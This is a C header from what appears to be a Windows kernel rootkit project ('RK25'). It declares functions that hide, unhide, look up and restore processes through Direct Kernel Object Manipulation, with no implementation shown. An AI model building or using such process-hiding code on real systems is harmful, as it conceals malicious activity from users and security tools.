#ifndef _RK25_DKOM_PROCESS_H_
#define  _RK25_DKOM_PROCESS_H_

// DKOM - Direct Kernel Object Manipulation

#include <ntddk.h>
#include "../../../common/system/kernel/rk25_kernel.h"
#include "../../../../common/rk25_dbg.h"
#include "../../../../common/rk25_def.h"
#include "../../../../common/list/rk25_list.h"

typedef struct _RK25_DKOM_PROCESS_DATA {
	HANDLE pid;
	UNICODE_STRING name;
	PLIST_ENTRY saveLinks;
} RK25_DKOM_PROCESS_DATA, RK25_DKOM_PD, *PRK25_DKOM_PD;

VOID RK25DKOMProcessInit();
VOID RK25DKOMProcessFree();

NTSTATUS RK25DKOMProcessHide(HANDLE pid);
NTSTATUS RK25DKOMProcessUnhide(HANDLE pid);
//NTSTATUS RK25DKOMProcessUnhideData(PRK25_DKOM_PD data);
PRK25_DKOM_PD RK25DKOMProcessGetByPID(HANDLE pid);
PRK25_DKOM_PD RK25DKOMProcessGetByName(PUNICODE_STRING name);
VOID RK25DKOMProcessRestore(HANDLE pid);

#endif // _RK25_DKOM_PROCESS_H_
